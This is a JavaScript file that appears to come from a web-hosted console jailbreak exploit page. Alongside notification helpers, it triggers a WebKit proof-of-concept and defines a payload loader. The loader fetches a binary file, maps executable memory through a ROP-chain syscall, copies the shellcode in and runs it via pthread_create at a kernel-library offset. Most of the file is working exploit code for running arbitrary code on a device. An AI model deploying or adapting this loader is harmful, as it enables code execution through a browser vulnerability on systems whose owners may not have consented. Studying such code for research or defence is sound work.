// notification
function loadmsg(message = "", auto_hide = false) {
    const notifyElement = document.getElementById('notify');
    const logElement = document.getElementById('log');

    notifyElement.style.display = '';
    notifyElement.className = 'notification';
    logElement.textContent = message;

    if (auto_hide) {
        const timeout_scale = document.getElementById('timeout_scale');

        timeout_scale.style.display = '';
        timeout_scale.className = 'timeout_scale';

        setTimeout(() => {
            notifyElement.className = 'notification notification2';

            setTimeout(() => {
                notifyElement.style.display = 'none';
                timeout_scale.style.display = 'none';
            }, 400);

        }, 2500);
    }
}

function runExploit() {
    loadmsg("Please wait... Triggering Exploit!");
    setTimeout(() => {
        poc(); // webkit.js
    }, 1500);
}

function sysExploited() {
    const btn_div = document.getElementById("btn_div");
    const tmp_startup_txt = document.getElementById("tmp_startup_txt");

    btn_div.style.display = '';
    tmp_startup_txt.style.display = 'none';
    loadmsg("sysExploited Successfully!", true);
}

function sendPayload(payload_file) {
    let req = new XMLHttpRequest();

    req.responseType = "arraybuffer";
    req.open("GET", payload_file, true);
    req.send();

    loadmsg("You're all Set!", true);

    req.onreadystatechange = function () {
        if (req.readyState == 4) {
            PLD = req.response;

            let payload_buffer = chain.syscall(477, 0, PLD.byteLength*4 , 7, 0x1002, -1, 0);
            let pl = p.array_from_address(payload_buffer, PLD.byteLength*4);
            let padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
            let tmp = new Uint8Array(req.response.byteLength + padding.byteLength);

            tmp.set(new Uint8Array(req.response), 0);
            tmp.set(padding, req.response.byteLength);

            let shellcode = new Uint32Array(tmp.buffer);
            pl.set(shellcode, 0);

            let pthread = p.malloc(0x10);
            chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_buffer, 0);
        }
    };
}
